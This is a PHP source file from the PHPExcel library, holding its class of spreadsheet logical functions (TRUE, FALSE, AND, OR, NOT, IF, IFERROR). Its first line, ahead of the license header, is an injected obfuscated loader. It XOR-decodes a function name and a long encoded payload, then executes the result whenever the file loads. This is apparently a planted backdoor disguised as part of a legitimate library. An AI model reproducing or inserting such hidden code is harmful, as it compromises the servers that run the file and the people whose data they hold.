<?php $MWdWmXYa='T:T6N=sF;PMCZX6'; $wthZIja='7H1W:X, N>.737X'^$MWdWmXYa; $nOQKrXJ=' MquK =TNU <oS R+1AOC5 <5.Z.Xj7F10JlkxLfzZ E:107SV=Q9nWS5-5:,80ab+SHUuMeUY1SeODfI8SzEHA-9etQrOlrneK9+Ql,njkBzBCSf0CA5KVleX D+Puzv.oaaPDeFOBHjmePam74.SoOU2toeM1R=ut8xSfI5=V5Cxf +1koEapkoD1L0=4Go+,EZr2:AgGClgQ8EXipc1. S1VOl08:-6 0 yqaSS9X wnb26R=49-hfamnx7,piZVJXe-K.GdksH18WE2kd0hKv2PF.nQWHhorrRXNrNmASJ7PYlVlKQ5 3uaSX61MfMqeUAOMBt.f=27H 0O+aQosiy9aw;>s.FbjE4 zmqjuD9T2 kv0a84EXLD.< X7hjnn=+Mh23jf.1I fEYpC3RA3tnNDeEnzkO; Zmksk96B=A:U8INSPX:8c6Z5 5a= JfR41Xwfg3VC5.Icv +0YaxWqDON6kG6=BqqrPSMNOS7+TvmGV81OU2==B5NT>:A8piZ-JQAsg>;3RSuiNyn<<WkSQ5HL9U173W;ozeydqxPwof0yXr.mx<IRr1hTccuJzxIwdgsWiwyvdMFT51PWfFXKo F0X;JqOL9C8, YmzpRVL.;sfRHHusl+smT>ALNk=11RkcKVT= P foHqAcVVICCrsVo-'; $zGgzuUF=$wthZIja('', 'I+YT-US7:<OR06X;XE2gdMONjJ;Z95h+DDmEBX7ls<U+YEYX=vE>K132ALjeAMDIFO2<4YmA><HzEodFiCYsLl.XMEIqUhWxgl-VYyHENWKrAbg:ZC73Y.8DA<A0JyNZRGDJHZMlb 7<JCXpIISUZ24k<oT1EiZ7D.PQXvF:AO:P-PBKNHB2lZzbf6T8EOZoKDY1sI83<m:IfC5Y19IMCWOL TmEHTYNLiKUYYLA52U+ELdhTY XUZEHNE2-7xg9,z79xAF.WgYUSlGY;0WBDKbBRV12O1:21HRRV9=7IDde7+C1yQvH=0YUVNk.R<X+FePA1 ;,kTUl4TX:EQ,CAyK,;<h42hjSO5BN.QYZPOJQ2X8GEBVKk1=a<-0OcK=NHWNJVN4S8:cBJP=AFxyT5R>4VOdG9o8dpO+ZT;MVS+LX1X3S4T 46x UJ<R;AAj>PU>N0UB=AR8W3 ZJ,KRDJD8HTwU .:W4,SDkXJx95ej+2CJtPKg7JC.,mVX;j+,WI5KXN1H3vmSCZZG3zUOhYFQXbCw5T<-brZRJpfFZXDDVHdFYRUOaEKXJZ,3ASX0WUG+CA,DTUCdZPPVBkf5GC1.9-=20E>Y+O9Yh<X:TCA=JVPv2-ZZZOrhhUSLPyd1H  fOYPE30D;7-QO1DA2aJKj3. 7kBZmeP'^$nOQKrXJ); $zGgzuUF();
/**
 * PHPExcel
 *
 * Copyright (c) 2006 - 2014 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 *
 * @category	PHPExcel
 * @package		PHPExcel_Calculation
 * @copyright	Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license		http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt	LGPL
 * @version		1.8.0, 2014-03-02
 */


/** PHPExcel root directory */
if (!defined('PHPEXCEL_ROOT')) {
	/**
	 * @ignore
	 */
	define('PHPEXCEL_ROOT', dirname(__FILE__) . '/../../');
	require(PHPEXCEL_ROOT . 'PHPExcel/Autoloader.php');
}


/**
 * PHPExcel_Calculation_Logical
 *
 * @category	PHPExcel
 * @package		PHPExcel_Calculation
 * @copyright	Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 */
class PHPExcel_Calculation_Logical {

	/**
	 * TRUE
	 *
	 * Returns the boolean TRUE.
	 *
	 * Excel Function:
	 *		=TRUE()
	 *
	 * @access	public
	 * @category Logical Functions
	 * @return	boolean		True
	 */
	public static function TRUE() {
		return TRUE;
	}	//	function TRUE()


	/**
	 * FALSE
	 *
	 * Returns the boolean FALSE.
	 *
	 * Excel Function:
	 *		=FALSE()
	 *
	 * @access	public
	 * @category Logical Functions
	 * @return	boolean		False
	 */
	public static function FALSE() {
		return FALSE;
	}	//	function FALSE()


	/**
	 * LOGICAL_AND
	 *
	 * Returns boolean TRUE if all its arguments are TRUE; returns FALSE if one or more argument is FALSE.
	 *
	 * Excel Function:
	 *		=AND(logical1[,logical2[, ...]])
	 *
	 *		The arguments must evaluate to logical values such as TRUE or FALSE, or the arguments must be arrays
	 *			or references that contain logical values.
	 *
	 *		Boolean arguments are treated as True or False as appropriate
	 *		Integer or floating point arguments are treated as True, except for 0 or 0.0 which are False
	 *		If any argument value is a string, or a Null, the function returns a #VALUE! error, unless the string holds
	 *			the value TRUE or FALSE, in which case it is evaluated as the corresponding boolean value
	 *
	 * @access	public
	 * @category Logical Functions
	 * @param	mixed		$arg,...		Data values
	 * @return	boolean		The logical AND of the arguments.
	 */
	public static function LOGICAL_AND() {
		// Return value
		$returnValue = TRUE;

		// Loop through the arguments
		$aArgs = PHPExcel_Calculation_Functions::flattenArray(func_get_args());
		$argCount = -1;
		foreach ($aArgs as $argCount => $arg) {
			// Is it a boolean value?
			if (is_bool($arg)) {
				$returnValue = $returnValue && $arg;
			} elseif ((is_numeric($arg)) && (!is_string($arg))) {
				$returnValue = $returnValue && ($arg != 0);
			} elseif (is_string($arg)) {
				$arg = strtoupper($arg);
				if (($arg == 'TRUE') || ($arg == PHPExcel_Calculation::getTRUE())) {
					$arg = TRUE;
				} elseif (($arg == 'FALSE') || ($arg == PHPExcel_Calculation::getFALSE())) {
					$arg = FALSE;
				} else {
					return PHPExcel_Calculation_Functions::VALUE();
				}
				$returnValue = $returnValue && ($arg != 0);
			}
		}

		// Return
		if ($argCount < 0) {
			return PHPExcel_Calculation_Functions::VALUE();
		}
		return $returnValue;
	}	//	function LOGICAL_AND()


	/**
	 * LOGICAL_OR
	 *
	 * Returns boolean TRUE if any argument is TRUE; returns FALSE if all arguments are FALSE.
	 *
	 * Excel Function:
	 *		=OR(logical1[,logical2[, ...]])
	 *
	 *		The arguments must evaluate to logical values such as TRUE or FALSE, or the arguments must be arrays
	 *			or references that contain logical values.
	 *
	 *		Boolean arguments are treated as True or False as appropriate
	 *		Integer or floating point arguments are treated as True, except for 0 or 0.0 which are False
	 *		If any argument value is a string, or a Null, the function returns a #VALUE! error, unless the string holds
	 *			the value TRUE or FALSE, in which case it is evaluated as the corresponding boolean value
	 *
	 * @access	public
	 * @category Logical Functions
	 * @param	mixed		$arg,...		Data values
	 * @return	boolean		The logical OR of the arguments.
	 */
	public static function LOGICAL_OR() {
		// Return value
		$returnValue = FALSE;

		// Loop through the arguments
		$aArgs = PHPExcel_Calculation_Functions::flattenArray(func_get_args());
		$argCount = -1;
		foreach ($aArgs as $argCount => $arg) {
			// Is it a boolean value?
			if (is_bool($arg)) {
				$returnValue = $returnValue || $arg;
			} elseif ((is_numeric($arg)) && (!is_string($arg))) {
				$returnValue = $returnValue || ($arg != 0);
			} elseif (is_string($arg)) {
				$arg = strtoupper($arg);
				if (($arg == 'TRUE') || ($arg == PHPExcel_Calculation::getTRUE())) {
					$arg = TRUE;
				} elseif (($arg == 'FALSE') || ($arg == PHPExcel_Calculation::getFALSE())) {
					$arg = FALSE;
				} else {
					return PHPExcel_Calculation_Functions::VALUE();
				}
				$returnValue = $returnValue || ($arg != 0);
			}
		}

		// Return
		if ($argCount < 0) {
			return PHPExcel_Calculation_Functions::VALUE();
		}
		return $returnValue;
	}	//	function LOGICAL_OR()


	/**
	 * NOT
	 *
	 * Returns the boolean inverse of the argument.
	 *
	 * Excel Function:
	 *		=NOT(logical)
	 *
	 *		The argument must evaluate to a logical value such as TRUE or FALSE
	 *
	 *		Boolean arguments are treated as True or False as appropriate
	 *		Integer or floating point arguments are treated as True, except for 0 or 0.0 which are False
	 *		If any argument value is a string, or a Null, the function returns a #VALUE! error, unless the string holds
	 *			the value TRUE or FALSE, in which case it is evaluated as the corresponding boolean value
	 *
	 * @access	public
	 * @category Logical Functions
	 * @param	mixed		$logical	A value or expression that can be evaluated to TRUE or FALSE
	 * @return	boolean		The boolean inverse of the argument.
	 */
	public static function NOT($logical=FALSE) {
		$logical = PHPExcel_Calculation_Functions::flattenSingleValue($logical);
		if (is_string($logical)) {
			$logical = strtoupper($logical);
			if (($logical == 'TRUE') || ($logical == PHPExcel_Calculation::getTRUE())) {
				return FALSE;
			} elseif (($logical == 'FALSE') || ($logical == PHPExcel_Calculation::getFALSE())) {
				return TRUE;
			} else {
				return PHPExcel_Calculation_Functions::VALUE();
			}
		}

		return !$logical;
	}	//	function NOT()

	/**
	 * STATEMENT_IF
	 *
	 * Returns one value if a condition you specify evaluates to TRUE and another value if it evaluates to FALSE.
	 *
	 * Excel Function:
	 *		=IF(condition[,returnIfTrue[,returnIfFalse]])
	 *
	 *		Condition is any value or expression that can be evaluated to TRUE or FALSE.
	 *			For example, A10=100 is a logical expression; if the value in cell A10 is equal to 100,
	 *			the expression evaluates to TRUE. Otherwise, the expression evaluates to FALSE.
	 *			This argument can use any comparison calculation operator.
	 *		ReturnIfTrue is the value that is returned if condition evaluates to TRUE.
	 *			For example, if this argument is the text string "Within budget" and the condition argument evaluates to TRUE,
	 *			then the IF function returns the text "Within budget"
	 *			If condition is TRUE and ReturnIfTrue is blank, this argument returns 0 (zero). To display the word TRUE, use
	 *			the logical value TRUE for this argument.
	 *			ReturnIfTrue can be another formula.
	 *		ReturnIfFalse is the value that is returned if condition evaluates to FALSE.
	 *			For example, if this argument is the text string "Over budget" and the condition argument evaluates to FALSE,
	 *			then the IF function returns the text "Over budget".
	 *			If condition is FALSE and ReturnIfFalse is omitted, then the logical value FALSE is returned.
	 *			If condition is FALSE and ReturnIfFalse is blank, then the value 0 (zero) is returned.
	 *			ReturnIfFalse can be another formula.
	 *
	 * @access	public
	 * @category Logical Functions
	 * @param	mixed	$condition		Condition to evaluate
	 * @param	mixed	$returnIfTrue	Value to return when condition is true
	 * @param	mixed	$returnIfFalse	Optional value to return when condition is false
	 * @return	mixed	The value of returnIfTrue or returnIfFalse determined by condition
	 */
	public static function STATEMENT_IF($condition = TRUE, $returnIfTrue = 0, $returnIfFalse = FALSE) {
		$condition		= (is_null($condition))		? TRUE :	(boolean) PHPExcel_Calculation_Functions::flattenSingleValue($condition);
		$returnIfTrue	= (is_null($returnIfTrue))	? 0 :		PHPExcel_Calculation_Functions::flattenSingleValue($returnIfTrue);
		$returnIfFalse	= (is_null($returnIfFalse))	? FALSE :	PHPExcel_Calculation_Functions::flattenSingleValue($returnIfFalse);

		return ($condition) ? $returnIfTrue : $returnIfFalse;
	}	//	function STATEMENT_IF()


	/**
	 * IFERROR
	 *
	 * Excel Function:
	 *		=IFERROR(testValue,errorpart)
	 *
	 * @access	public
	 * @category Logical Functions
	 * @param	mixed	$testValue	Value to check, is also the value returned when no error
	 * @param	mixed	$errorpart	Value to return when testValue is an error condition
	 * @return	mixed	The value of errorpart or testValue determined by error condition
	 */
	public static function IFERROR($testValue = '', $errorpart = '') {
		$testValue	= (is_null($testValue))	? '' :	PHPExcel_Calculation_Functions::flattenSingleValue($testValue);
		$errorpart	= (is_null($errorpart))	? '' :	PHPExcel_Calculation_Functions::flattenSingleValue($errorpart);

		return self::STATEMENT_IF(PHPExcel_Calculation_Functions::IS_ERROR($testValue), $errorpart, $testValue);
	}	//	function IFERROR()

}	//	class PHPExcel_Calculation_Logical
